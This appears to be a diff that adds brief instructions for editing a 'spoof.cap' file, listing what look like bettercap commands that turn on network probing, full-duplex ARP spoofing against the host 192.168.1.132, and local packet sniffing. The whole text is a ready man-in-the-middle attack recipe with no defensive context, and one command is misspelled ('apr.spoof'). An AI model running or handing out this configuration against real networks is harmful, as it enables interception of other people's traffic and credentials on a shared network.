@@ -1,0 +1,11 @@
+modify the spoof.cap file as follow
+-----------------------------------------
+net.probe on
+net.recon on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.132
+apr.spoof on
+set net.sniff.local true
+net.sniff on
+-----------------------------------------
+
